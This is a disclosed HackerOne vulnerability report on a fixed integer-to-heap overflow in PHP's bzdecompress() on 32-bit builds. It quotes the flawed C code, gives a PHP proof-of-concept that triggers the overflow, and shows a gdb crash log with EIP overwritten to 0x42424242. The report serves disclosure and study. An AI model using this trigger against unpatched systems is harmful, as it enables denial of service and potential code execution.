# Heap overflow due to integer overflow in bzdecompress() function

## Report Details
- **Report ID**: 180563
- **URL**: https://hackerone.com/reports/180563
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-07T02:05:13.928Z
- **Disclosed**: 2019-11-12T09:21:52.975Z

## Reporter
- **Username**: fosec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73386
Description:
------------
I have found some vulnerable code at ```bzdecompress()``` function in module Bzip2. ```bzdecompress() function``` creates a new zend_string object to store decompressed data. The size of destination string depends on the size of source string. ( refer at ```ext/bz2/bz2.c:589``` )

``` c
static PHP_FUNCTION(bzdecompress)
{
....
	bzs.avail_in = source_len;
	/* in most cases bz2 offers at least 2:1 compression, so we use that as our base */
	bzs.avail_out = source_len * 2;
	dest = zend_string_alloc(bzs.avail_out + 1, 0);
....
}
```

If compressed string is too long, ```bzs.avail_out``` will be an unexpected value and ```zend_string_alloc()``` function will allocate a small memory range. Due to missing check of size before calling
```zend_string_alloc()```, this new memory range can not use to store large decompressed data and lead to heap overflow. The overflow results as arbitrary code execution, I can control eip register to the arbitrary value. This bug is only triggered in 32bit machine.

Test script:
---------------
``` php
<?php
ini_set('memory_limit', -1);
$s = str_repeat('A', 0xE3AC)."BBBB".str_repeat('C', 0x1C50);
$a = bzcompress($s);
$a = $a.str_repeat('A', 4634 - strlen($a));
$a = str_repeat($a, 0x7ffffffe / strlen($a)); // try to create a compressed data with large size
bzdecompress($a); // trigger this vulnerability
?>
```
Actual result:
--------------
```
[root@local PHP-7.1]# gdb --args sapi/cli/php -f ../crash/bz_poc.php

[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x1
ECX: 0xffffff60
EDX: 0x7fff
ESI: 0xb7813020 --> 0xb78743f0 ('A' <repeats 28 times>, "BBBB", 'C' <repeats 168 times>...)
EDI: 0xb787440c ("BBBB", 'C' <repeats 196 times>...)
EBP: 0xbfffc094 --> 0x0
ESP: 0xbfffbffc --> 0x835fd02 (<execute_ex+34>: test   edi,edi)
EIP: 0x42424242 --> 0x2478184
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0x42424242:  test   BYTE PTR [ecx+0x60380247],al
   0x42424248:  inc    ecx
   0x42424249:  inc    ecx
   0x4242424a:  inc    ecx
[------------------------------------stack-------------------------------------]
0000| 0xbfffbffc --> 0x835fd02 (<execute_ex+34>:        test   edi,edi)
0004| 0xbfffc000 --> 0xbfffc094 --> 0x0
0008| 0xbfffc004 --> 0xb7864180 --> 0x2
0012| 0xbfffc008 --> 0x0
0016| 0xbfffc00c --> 0x83aed9b (<zend_execute+315>:     mov    edx,DWORD PTR [esp+0x18])
0020| 0xbfffc010 --> 0xb7813020 --> 0xb78743f0 ('A' <repeats 28 times>, "BBBB", 'C' <repeats 168 times>...)
0024| 0xbfffc014 --> 0x0
0028| 0xbfffc018 --> 0x1c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ i r eip
eip            0x42424242       0x42424242
gdb-peda$
```
EIP is controlled as **0x42424242**, from the input **"BBBB"**.

## Attachments
No attachments
